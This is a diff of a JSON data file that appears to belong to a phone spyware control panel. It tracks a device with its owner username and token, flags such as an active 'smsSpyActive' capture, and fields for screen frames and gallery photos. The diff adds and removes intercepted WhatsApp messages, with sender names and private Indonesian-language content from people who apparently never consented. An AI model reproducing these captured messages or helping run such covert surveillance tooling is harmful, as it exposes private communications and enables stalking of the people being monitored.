@@ -4,7 +4,7 @@
     "deviceName": "HP-PEW-3BFE",
     "ownerUsername": "Youbie",
     "token": "00613901ddb20be7b9614da5e8ef8e90",
-    "lastSeen": 1776924685185,
+    "lastSeen": 1776924694094,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-22T07:08:58.851Z",
@@ -20,6 +20,30 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "Nakan",
+        "content": "jadi ikut ke save di hp kmu",
+        "time": "23/04 14:11",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776924695104
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎62 pesan dari 40 chat",
+        "time": "23/04 14:11",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776924685884
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎62 pesan dari 40 chat",
+        "time": "23/04 14:11",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776924685761
+      },
       {
         "appName": "WhatsApp",
         "sender": "Nakan",
@@ -3995,30 +4019,6 @@
         "time": "23/04 09:54",
         "pkg": "com.whatsapp",
         "receivedAt": 1776909279466
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "Rafly",
-        "content": "kalo mau nunggu bang reno ini",
-        "time": "23/04 09:54",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776909279180
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎63 pesan dari 40 chat",
-        "time": "23/04 09:54",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776909277919
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "prily 🤍",
-        "content": "makasih sayangg",
-        "time": "23/04 09:54",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776909277898
       }
     ],
     "galleryPhotos": [],
